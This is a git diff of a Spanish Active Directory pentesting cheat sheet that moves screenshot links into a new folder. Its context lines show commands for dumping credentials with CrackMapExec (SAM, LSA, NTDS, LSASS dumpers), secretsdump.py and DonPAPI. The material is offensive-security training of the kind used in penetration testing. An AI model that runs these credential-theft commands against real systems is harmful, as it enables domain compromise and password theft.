@@ -15,11 +15,11 @@ cme smb <Target IP> -u <user> -p '<pass>' -M handlekatz
 cme smb <Target IP> -u <user> -p '<pass>' -M nanodump
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/img1.png?raw=true "lsassy 1")
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/img2.png?raw=true "lsassy 2")
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/img3.png?raw=true "Procdump")
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/img4.png?raw=true "Handlekatz")
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/img5.png?raw=true "Nanodump")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img1.png?raw=true "lsassy 1")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img2.png?raw=true "lsassy 2")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img3.png?raw=true "Procdump")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img4.png?raw=true "Handlekatz")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img5.png?raw=true "Nanodump")
 
 
 # SAM
@@ -31,7 +31,7 @@ Las credenciales que se almacenan en este componente son las locales del sistema
 cme smb <Target IP> -u <user> -p '<pass>' --sam
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/img6.png?raw=true "SAM")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img6.png?raw=true "SAM")
 
 # LSA
 
@@ -42,7 +42,7 @@ Las credenciales que se almacenan en este componente son aquellas que se encuent
 cme smb <Target IP> -u <user> -p '<pass>' --lsa
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/img7.png?raw=true "LSA")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img7.png?raw=true "LSA")
 
 # NTDS
 
@@ -55,7 +55,7 @@ cme smb <Target IP> -u <user> -p '<pass>' --ntds
 cme smb <Target IP> -u <user> -p '<pass>' -M ntdsutil
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/img8.png?raw=true "NTDS")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img8.png?raw=true "NTDS")
 
 
 # MULTIPLES CREDS
@@ -65,7 +65,7 @@ cme smb <Target IP> -u <user> -p '<pass>' -M ntdsutil
 secretsdump.py <Dominio>/<user>:'<pass>'@<Target IP>
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/img9.png?raw=true "Secretsdump")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img9.png?raw=true "Secretsdump")
 
 ```Bash
 # DonPAPI - Windows creds/Vaults/RDP/certificates/AdConnect/Internet explorer/Chrome/Firefox/VNC/mRemoteNG passwords
@@ -74,4 +74,4 @@ DonPAPI <Dominio>/<user>:'<pass>'@<Target IP>
 DonPAPI -R
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/img10.png?raw=true "DoPAPI")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img10.png?raw=true "DoPAPI")
